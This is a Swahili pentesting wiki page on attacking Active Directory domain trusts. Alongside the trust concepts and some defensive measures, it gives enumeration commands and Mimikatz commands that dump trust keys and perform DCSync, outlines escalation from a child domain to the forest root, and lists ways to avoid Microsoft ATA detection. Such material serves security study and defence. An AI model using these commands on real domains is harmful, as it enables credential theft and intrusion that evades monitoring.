Katika hali ya kawaida, ikiwa mtumiaji anataka kufikia service katika **trusted domain**, awali lazima aombe ticket maalum inayoitwa **inter-realm TGT** kutoka kwa DC ya domain yao. TGT hii imekryptiwa kwa **trust key** ambayo domain zote mbili zimekubaliana. Mtumiaji kisha aniwasilisha inter-realm TGT hii kwa **DC ya trusted domain** ili kupata service ticket (**TGS**). Baada ya DC ya trusted domain kuthibitisha inter-realm TGT kwa kutumia trust key yao na ikiwa ni sahihi, itatoa TGS, ikimpa mtumiaji ufikiaji wa service.

**Steps**:

1. A **client computer** katika **Domain 1** inaanza mchakato kwa kutumia **NTLM hash** yake kuomba **Ticket Granting Ticket (TGT)** kutoka kwa **Domain Controller (DC1)**.
2. DC1 hutolewa TGT mpya ikiwa client imethibitishwa kwa mafanikio.
3. Client kisha inaomba **inter-realm TGT** kutoka DC1, ambayo inahitajika kufikia rasilimali katika **Domain 2**.
4. Inter-realm TGT imekryptiwa kwa **trust key** iliyoshirikiwa kati ya DC1 na DC2 kama sehemu ya two-way domain trust.
5. Client inabeba inter-realm TGT kwenda kwa **Domain 2's Domain Controller (DC2)**.
6. DC2 inathibitisha inter-realm TGT kwa kutumia shared trust key na, ikiwa sahihi, inatoa **Ticket Granting Service (TGS)** kwa server katika Domain 2 ambayo client anataka kufikia.
7. Mwishowe, client inawasilisha TGS hii kwa server, ambayo imekryptiwa na hash ya akaunti ya server, ili kupata ufikiaji wa service katika Domain 2.

### Different trusts

Ni muhimu kutambua kwamba **trust inaweza kuwa one way au two ways**. Katika uchaguzi wa two ways, domain zote mbili zitakuwa zinamtumaini kila mmoja, lakini katika uhusiano wa **one way** moja ya domain itakuwa **trusted** na nyingine itakuwa **trusting** domain. Katika kesi ya mwisho, **utakuwa na uwezo wa kufikia rasilimali ndani ya trusting domain kutoka trusted domain pekee**.

Iwapo Domain A inamtumaini Domain B, A ni trusting domain na B ni trusted. Zaidi ya hayo, katika **Domain A**, hii itakuwa **Outbound trust**; na katika **Domain B**, hii itakuwa **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Hili ni mpangilio wa kawaida ndani ya forest ileile, ambapo child domain kwa kawaida ina two-way transitive trust na parent domain yake. Kwa kifupi, hii inamaanisha kwamba maombi ya uthibitisho yanaweza kusafiri kwa urahisi kati ya parent na child.
- **Cross-link Trusts**: Zinajulikana kama "shortcut trusts," hizi zinatengwa kati ya child domains ili kuharakisha mchakato wa referral. Katika forests tata, referrals za uthibitisho kwa kawaida zinahitaji kusafiri hadi root ya forest kisha kushuka hadi domain inayolengwa. Kwa kuunda cross-links, safari inafupishwa, jambo lenye manufaa katika mazingira yaliyotawanyika kijiografia.
- **External Trusts**: Hizi zimeratibiwa kati ya domains tofauti, zisizohusiana na ni non-transitive kwa asili. Kulingana na [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts zinatumika kufikia rasilimali katika domain nje ya current forest ambayo haijumuishwaji na forest trust. Usalama unaimarishwa kupitia SID filtering kwa external trusts.
- **Tree-root Trusts**: Trusts hizi zinaanzishwa moja kwa moja kati ya forest root domain na tree root mpya iliyoongezwa. Ingawa hazikufunuliwa sana, tree-root trusts ni muhimu kwa kuongeza miti mipya ya domain kwenye forest, zikiruhusu kudumisha jina la domain la kipekee na kuhakikisha two-way transitivity. Taarifa zaidi inaweza kupatikana katika [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Aina hii ya trust ni two-way transitive trust kati ya forest root domains mbili, pia ikitekeleza SID filtering ili kuongeza hatua za usalama.
- **MIT Trusts**: Trusts hizi zinaanzishwa na non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts ni maalum zaidi na zinahudumia mazingira yanayohitaji ushirikiano na mifumo ya Kerberos nje ya ekosistimu ya Windows.

#### Other differences in **trusting relationships**

- Uhusiano wa trust unaweza pia kuwa **transitive** (A trust B, B trust C, basi A trust C) au **non-transitive**.
- Uhusiano wa trust unaweza kuwekwa kama **bidirectional trust** (pande zote zinatumiani) au kama **one-way trust** (moja tu inamtumaini mwingine).

### Attack Path

1. **Enumerate** uhusiano wa trusting
2. Angalia ikiwa kuna **security principal** (user/group/computer) ambaye ana **access** kwa rasilimali za **domain nyingine**, labda kupitia ACE entries au kwa kuwa katika vikundi vya domain nyingine. Tafuta **relationships across domains** (trust ilianzishwa kwa ajili ya hili pengine).
1. kerberoast katika kesi hii inaweza kuwa chaguo nyingine.
3. **Compromise** akaunti ambazo zinaweza **pivot** kupitia domains.

Wavamizi wanaweza kupata ufikiaji wa rasilimali katika domain nyingine kupitia njia kuu tatu:

- **Local Group Membership**: Principals wanaweza kuongezwa kwenye vikundi vya local kwenye mashine, kama “Administrators” group kwenye server, ikiwapa udhibiti mkubwa wa mashine hiyo.
- **Foreign Domain Group Membership**: Principals pia wanaweza kuwa wanachama wa vikundi ndani ya foreign domain. Hata hivyo, ufanisi wa njia hii unategemea aina ya trust na eneo la kikundi.
- **Access Control Lists (ACLs)**: Principals wanaweza kutajwa katika **ACL**, hasa kama entities katika **ACEs** ndani ya **DACL**, wakiwapa ufikiaji wa rasilimali maalum. Kwa wale wanaotaka kujifunza kwa undani mechanics za ACLs, DACLs, na ACEs, whitepaper iliyoitwa “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ni rasilimali muhimu.

### Find external users/groups with permissions

Unaweza kuangalia **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** kupata foreign security principals katika domain. Hawa watakuwa user/group kutoka **external domain/forest**.

Unaweza kuchunguza hili kwa kutumia **Bloodhound** au powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Njia nyingine za kuorodhesha domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Kuna **2 trusted keys**, moja kwa ajili ya _Child --> Parent_ na nyingine kwa ajili ya _Parent_ --> _Child_.\
> Unaweza kuona ile inayotumika na domain ya sasa kwa kutumia:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Panda hadhi hadi Enterprise Admin katika domain ya child/parent kwa kuabusu trust kwa SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Kuelewa jinsi Configuration Naming Context (NC) inaweza kutumiwa ni muhimu. Configuration NC inafanya kama hazina kuu ya data za konfigurishaji ndani ya forest katika mazingira ya Active Directory (AD). Data hii inariplikatwa kwa kila Domain Controller (DC) ndani ya forest, na DC zinazoweza kuandikwa zina nakala inayoweza kuandikwa ya Configuration NC. Ili kuitumia, lazima kuwa na **SYSTEM privileges on a DC**, bora DC wa child.

**Link GPO to root DC site**

Container ya Sites ya Configuration NC inajumuisha taarifa kuhusu maeneo ya kompyuta zote zilizounganishwa na domain ndani ya AD forest. Kwa kufanya kazi ukiwa na **SYSTEM privileges on any DC**, wadukuzi wanaweza link GPOs kwa root DC sites. Kitendo hiki kinaweza kuhatarisha root domain kwa kubadilisha sera zinazotumika kwa maeneo haya.

Kwa maelezo ya kina, unaweza kusoma utafiti wa [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Vector ya shambulio inahusisha kulenga gMSAs zilizo na ruhusa ndani ya domain. KDS Root key, muhimu kwa kuhesabu nywila za gMSAs, imehifadhiwa ndani ya Configuration NC. Ukiwa na **SYSTEM privileges on any DC**, inawezekana kupata KDS Root key na kuhesabu nywila za gMSA yoyote ndani ya forest.

Uchambuzi wa kina na mwongozo wa hatua kwa hatua unaweza kupatikana katika:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Shambulio la ziada la delegated MSA (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Utafiti wa ziada wa nje: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Njia hii inahitaji uvumilivu, kusubiri uundaji wa vitu vipya vya AD vyenye ruhusa za juu. Ukiwa na **SYSTEM privileges**, mshambuliaji anaweza kubadilisha AD Schema ili kumuwezesha mtumiaji yeyote kupata udhibiti kamili juu ya madarasa yote. Hii inaweza kusababisha upatikanaji usioidhinishwa na udhibiti wa vitu vipya vya AD.

Kusoma zaidi kunaweza kupatikana kwenye [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Udhaifu wa ADCS ESC5 unalenga kupata udhibiti wa vitu vya Public Key Infrastructure (PKI) ili kuunda template ya cheti inayoruhusu authentication kama mtumiaji yeyote ndani ya forest. Kwa kuwa vitu vya PKI viko katika Configuration NC, ku-compromise DC wa child aliye writeable kunaruhusu utekelezaji wa ESC5 attacks.

Maelezo zaidi kuhusu hili yanapatikana kwenye [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Katika mazingira yasiyo na ADCS, mshambuliaji anaweza kutengeneza vipengele vinavyohitajika, kama ilivyoelezwa katika [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Katika tukio hili **domaini yako imeaminishwa** na nyingine ya nje ikikupa **idhinisho zisizojulikana** juu yake. Utahitaji kubaini **ni principals gani katika domaini yako wana upatikanaji gani juu ya domaini ya nje** na kisha kujaribu ku-exploit:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domaini ya Msitu ya Nje - Njia Moja (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Katika senario hii **your domain** inakuwa **trusting** baadhi ya **privileges** kwa **principal** kutoka **different domains**.

Hata hivyo, wakati **a domain is trusted** na domain inayomwamini, domain iliyothibitishwa **creates a user** yenye **predictable name** inayotumia kama **password the trusted password**. Hii ina maana kwamba inawezekana **access a user from the trusting domain to get inside the trusted one** ili kuitafuta na kujaribu kuongeza privileges zaidi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Njia nyingine ya kuathiri domain iliyothibitishwa ni kupata [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) iliyoundwa kwa mwelekeo wa **opposite direction** wa domain trust (ambayo si ya kawaida sana).

Njia nyingine ya kuathiri domain iliyothibitishwa ni kusubiri kwenye mashine ambapo **a user from the trusted domain can access** kuingia kupitia **RDP**. Kisha, mshambuliaji anaweza kuingiza code katika mchakato wa RDP session na **access the origin domain of the victim** kutoka hapo.\ Moreover, ikiwa **victim mounted his hard drive**, kutoka kwa mchakato wa **RDP session** mshambuliaji anaweza kuhifadhi **backdoors** katika **startup folder of the hard drive**. Tekniku hii inaitwa **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Hatari ya mashambulizi yanayotumia SID history attribute kwa njia ya forest trusts hupunguzwa na SID Filtering, ambayo imewezeshwa kwa default kwenye inter-forest trusts zote. Hii inaungwa mkono kwa dhana kwamba intra-forest trusts ni salama, ikizingatia forest, badala ya domain, kama mpaka wa usalama kulingana na mtazamo wa Microsoft.
- Hata hivyo, kuna changamoto: SID filtering inaweza kuathiri applications na upatikanaji wa watumiaji, ikapelekea kuzimwa kwake mara kwa mara.

### **Selective Authentication:**

- Kwa inter-forest trusts, kutumia Selective Authentication huhakikisha kwamba watumiaji kutoka misitu miwili hawathibitishwi kiotomatiki. Badala yake, ruhusa maalum zinahitajika kwa watumiaji kufikia domains na servers ndani ya trusting domain au forest.
- Ni muhimu kutambua kwamba hatua hizi hazilindi dhidi ya unyonyaji wa writable Configuration Naming Context (NC) au mashambulizi dhidi ya trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Baadhi ya Kinga za Jumla

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Hatua za Kuzuia kwa Ulinzi wa Credentials**

- **Domain Admins Restrictions**: Inashauriwa kwamba Domain Admins waweze kuingia tu kwenye Domain Controllers, kuepuka matumizi yao kwenye hosts nyingine.
- **Service Account Privileges**: Huduma zisifanywe run zikiendeshwa kwa Domain Admin (DA) privileges ili kudumisha usalama.
- **Temporal Privilege Limitation**: Kwa kazi zinazohitaji DA privileges, muda wake unapaswa kufungwa. Hii inaweza kufanyika kwa: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementing Deception Techniques**

- Kutekeleza deception kunahusisha kuweka mitego, kama watumiaji wa kuiga (decoy users) au kompyuta, zenye sifa kama passwords ambazo hazitoweki au zimewekwa kama Trusted for Delegation. Mbinu ya kina inajumuisha kuunda watumiaji wenye haki maalum au kuwaongeza kwenye vikundi vya hali ya juu.
- Mfano wa vitendo unahusisha matumizi ya zana kama: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Zaidi kuhusu kutekeleza deception techniques zinapatikana kwenye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Viashiria vinavyotia shaka ni pamoja na ObjectSID isiyo ya kawaida, kuingia mara chache (infrequent logons), tarehe za uundaji, na idadi ndogo ya majaribio mabaya ya password.
- **General Indicators**: Kulinganisha sifa za vitu vinavyoweza kuwa decoy na zile za vitu halisi kunaweza kufichua kutofanana. Zana kama [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) zinaweza kusaidia kutambua deception hizo.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Kuepuka session enumeration kwenye Domain Controllers ili kuzuia utambuzi wa ATA.
- **Ticket Impersonation**: Kutumia vitufe vya **aes** kwa ajili ya uundaji wa tiketi husaidia kutoweka utambuzi kwa kutoangusha hadi NTLM.
- **DCSync Attacks**: Kutekeleza kutoka non-Domain Controller ili kuepuka utambuzi wa ATA kunapendekezwa, kwani utekelezaji wa moja kwa moja kutoka Domain Controller utasababisha tahadhari.

## Marejeo

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

{{#include ../../banners/hacktricks-training.md}}
